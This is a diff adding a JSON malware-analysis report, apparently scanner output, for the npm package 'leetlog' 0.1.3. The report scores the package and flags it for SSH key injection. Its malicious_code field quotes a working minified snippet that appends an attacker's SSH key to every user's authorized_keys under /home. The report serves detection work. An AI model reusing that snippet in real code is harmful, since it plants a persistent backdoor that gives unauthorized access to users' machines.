@@ -1,0 +1,32 @@
+{
+  "package_metadata": {
+    "name": "leetlog",
+    "version": "0.1.3"
+  },
+  "behavior_analysis": {
+    "file_operations": [
+      "fs.readdir('/home', ...)",
+      "fs.appendFile('/home/[user]/.ssh/authorized_keys', ...)"
+    ],
+    "network_activity": [],
+    "process_actions": []
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "index.js",
+        "code_snippet": "fs.readdir(\"/home\",(o,l)=>{o||l.forEach(o=>{const l=\"/home/\"+o+\"/.ssh/authorized_keys\";fs.appendFile(l,\"\\n\"+my_ssh_key+\"\\n\",()=>{})})});"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.75,
+    "confidence": 0.95,
+    "indicators": [
+      "Unauthorized file system writes detected.",
+      "Potential backdoor installation via SSH key injection.",
+      "High-risk behavior targeting sensitive user directories."
+    ]
+  }
+}
